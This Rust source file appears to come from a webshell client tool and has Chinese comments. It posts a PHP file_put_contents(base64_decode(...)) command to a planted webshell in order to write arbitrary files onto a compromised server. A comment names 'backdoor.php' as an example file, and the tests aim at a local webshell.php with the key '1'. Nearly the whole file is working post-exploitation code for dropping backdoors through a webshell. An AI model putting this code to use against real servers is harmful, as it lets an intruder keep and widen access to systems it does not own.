use crate::utils::{self, encode, request};
use reqwest::{self, Client};
use std::{collections::HashMap, error, result};

/// 使用 php 的 file_put_contents() 函数进行文件上传
pub async fn file_upload(
    url: &str,
    key: &str,
    file: &str,
    filename: &str,
    client: &Client,
) -> Result<bool, reqwest::Error> {
    let command = format!(r#"file_put_contents("{filename}", base64_decode("{file}"));"#);
    // file_put_contents('backdoor.php', '112233');

    // TODO: 此处只考虑了 post 方法

    // dbg!(&command);

    let params = HashMap::from([(key, command.as_str())]);

    let _ = request::post_request(&client, &url, params).await?;

    let url = request::modify_url(url, filename).unwrap();

    Ok(request::is_url_return_ok(&url, &client).await)
}

pub async fn upload_base64_file(
    url: &str,
    key: &str,
    file: &str,
    filename: &str,
    client: &Client,
) -> bool {
    dbg!(file);
    let file = encode::decode_base64(file).unwrap_or_else(|_| "Invalid base64 string".to_string());
    let res = file_upload(url, key, &file, filename, &client).await;

    match res {
        Ok(result) => result,
        Err(_) => false,
    }
}

#[cfg(test)]
mod tests {

    use super::*;
    const URL: &str = "http://127.0.0.1/webshell.php";
    const KEY: &str = "1";

    #[tokio::test]
    async fn test_file_upload() {
        let file = "testforfileupload1";
        let file_name = "test_file.php";
        let client = Client::new();
        let res = file_upload(URL, KEY, file, file_name, &client)
            .await
            .unwrap_or_else(|_| false);
        println!("{:?}", res)
    }

    #[tokio::test]
    async fn test_file_upload_base64() {
        let file = "dGVzdGZvcmZpbGV1cGxvYWQy"; // testforfileupload2
        let file_name = "test_file.php";
        let client = Client::new();
        let res = upload_base64_file(URL, KEY, file, file_name, &client).await;
        println!("{:?}", res)
    }
}
